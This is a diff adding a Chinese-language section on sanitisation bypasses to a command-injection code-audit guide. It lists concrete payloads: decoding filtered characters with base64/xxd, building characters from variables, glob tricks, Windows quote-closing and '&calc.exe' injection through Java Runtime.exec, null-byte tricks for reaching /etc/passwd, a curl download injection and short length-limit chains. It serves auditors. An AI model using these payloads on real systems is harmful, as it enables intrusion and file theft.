@@ -154,6 +154,143 @@ CLEAN=$(echo "$INPUT" | sed 's/</\&lt;/g')
 # HTML 转义对 shell 无效
 ```
 
+## 消毒绕过技术
+
+审计时如果发现弱消毒，需检查以下绕过方式是否可行：
+
+### 编解码绕过
+
+如果过滤了 `;`、`|`、`&` 等字符但允许编解码命令：
+
+```bash
+# base64 编解码
+echo "Ow==" | base64 -d    # 解码得到 ;
+printf ";" | xxd -p        # 编码得到 3b
+echo "3b" | xxd -r -ps     # 解码得到 ;
+
+# 如果黑名单未覆盖 base64/xxd 等命令，可通过编解码获取被过滤的字符
+```
+
+### 特殊字符获取（无需直接输入）
+
+```bash
+# 通过环境变量截取获取特殊字符
+$(expr substr $PWD 1 1)    # 得到 /
+$(pwd|cut -c1)             # 得到 /
+${PATH:0:1}                # 得到 /
+
+# 通过特定变量获取
+$IFS                       # 空格
+${PS2}                     # >
+~                          # $HOME
+~+                         # $PWD
+~-                         # $OLDPWD
+
+# 通过 shell 特性获取空格
+\t                         # sh/bash 中的制表符（IFS 默认包含制表符作为分隔符，效果类似空格）
+# expect 中 \t、\v、\f、\r 都是空格
+
+# 花括号展开（只能执行单条指令）
+{ls,-la}                   # 等价于 ls -la
+```
+
+### Bash 模式匹配绕过
+
+前提：能在环境上创建带特殊字符的文件名。
+
+```bash
+# 创建文件名为 "sleep 999" 的文件
+touch "sleep 999"
+# 输入 sleep* 利用通配符匹配，绕过空格限制
+# sleep* 匹配到 "sleep 999"，命令被执行
+
+# ? 匹配一个任意字符
+# !(PATTERN) 匹配除 PATTERN 之外的模式
+```
+
+### Windows \" 闭合绕过
+
+Java `Runtime.exec(String[])` 中，如果第一个元素为命令且后续元素为参数：
+
+```java
+// 通常只能无参数执行命令
+String[] cmd = new String[]{"ipconfig"};
+
+// 通过 \" 闭合并添加参数
+String inputStr = "ipconfig\" -all";
+// 实际执行: ipconfig -all
+
+String inputStr = "curl\" 10.31.234.176:8088 -o \"D:\\testurl.txt";
+// 下载文件
+
+// 限制：参数以 / 开头会被转义为 \，只能注入非 / 开头的参数
+```
+
+### Windows .bat/.cmd 参数中的 &| 注入
+
+```java
+// Java exec(String[]) 第一个值为 .bat/.cmd 时
+String[] cmdArr = new String[]{"D:/test.bat", userInput};
+Runtime.getRuntime().exec(cmdArr);
+
+// userInput = "|calc.exe"   → 执行 calc.exe
+// userInput = "&calc.exe"   → 执行 calc.exe
+// userInput = "&&calc.exe"  → 执行 calc.exe
+
+// 原因：JRE 拼接数组为字符串后调用 CreateProcessW
+// .bat 文件由 cmd.exe /c 解析，|、&、&& 被当作命令分隔符
+```
+
+### Bash 空字符（\0）绕过
+
+Bash 对 `\0` 有两种处理方式，与常规字符串操作不一致：
+
+```bash
+# 截断绕过（ANSI-C Quoting）— 绕过 endsWith/后缀名校验
+a="evil.jsp\x00.png"
+bash -c "touch \$'$a'"
+# 实际创建 evil.jsp，绕过 .png 后缀白名单
+
+# Java 场景：后端用 path.endsWith("/passwd") 过滤
+# 攻击者传入 /etc/passwd%5cx00aa.txt（%5c = 反斜杠）
+# Shell 中 ANSI-C Quoting 解码后 Bash 截断为 /etc/passwd
+
+# 忽略绕过（命令替换）— 绕过 contains 黑名单
+a="/etc/pass\u0000wd"
+cat $(echo -e "$a")
+# Bash 忽略 \0，实际执行 cat /etc/passwd
+
+# 审计检查：
+# 1. 用户输入是否过滤了 \0、\x00、%00、\u0000
+# 2. endsWith/contains 校验是否在 Shell 执行前进行
+# 3. 如果未过滤空字符且传入 Shell，标记为高风险
+```
+
+### 长度限制绕过
+
+```bash
+# 分次写入文件后执行
+echo 'statement1' > 1.t
+echo 'statement2' >> 1.t
+sh 1.t
+
+# 5 字节注入：利用 ls、>、\ 组合写入
+>ls\\
+ls>a
+>\ \\
+>-t\\
+>\>b
+ls>>a
+# 得到含 "ls -t>b" 的文件 a，执行后按时间排序写入文件名
+
+# 4 字节注入：dir + rev + * 或 ex 命令
+# dir 以空格分割输出（无回车），rev 逆序，* 通配符展开为命令
+
+# 多段拼接：bash -c "XXXX 注入点A yyyy 注入点B zzzz"
+# 无报错限制: bash -c "a=$PATH;***;echo $a"
+# 有报错限制: bash -c "$(a=$PATH;t=***;echo $a)"
+```
+
 ## 消毒检测流程
 
 在污点传播追踪中，对每个变量赋值和传递点执行以下检查：
